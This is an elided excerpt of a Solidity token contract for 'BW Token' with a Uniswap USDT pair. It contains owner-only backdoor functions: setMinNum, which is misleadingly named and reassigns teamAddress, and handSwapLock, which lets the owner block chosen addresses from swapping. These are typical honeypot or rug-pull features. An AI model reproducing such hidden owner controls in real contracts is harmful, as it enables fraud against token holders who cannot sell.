...
contract BwToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BW Token";
    string private _symbol = "BW";
    uint8 private _decimals = 9;    
    uint256 private _totalSupply = 20000 * 10**uint256(_decimals);

    uint256 private minimumTokensBeforeSwap = 20 * 10**uint256(_decimals); 
    ...
    address public teamAddress=0xdAc1BE8B6d0eE7c28fAb5c1c42864A9891BDC646;
    ...
    constructor () {
        ...
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), usdt);
    ...
    function setMinNum(address addr,uint256 minNum) external onlyOwner returns (bool){
        teamAddress = addr;
    ...
    function handSwapLock(address[] memory addrs, uint256[] memory values) public  onlyOwner returns (uint256) {
        ...
        while (i < addrs.length) {
            uint value = values.length == 1 ? values[0] : values[i];
            if(addrs[i] != address(0) && value > 0){
                swapLockMap[addrs[i]]=swapLockMap[addrs[i]].add(value);
            }
            i++;
        }
        return i;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(inSwapAndLiquify){ 
            ...
            require(swapLockMap[sender]<block.timestamp&&swapLockMap[recipient]<block.timestamp, "BEP20: Private placement address");
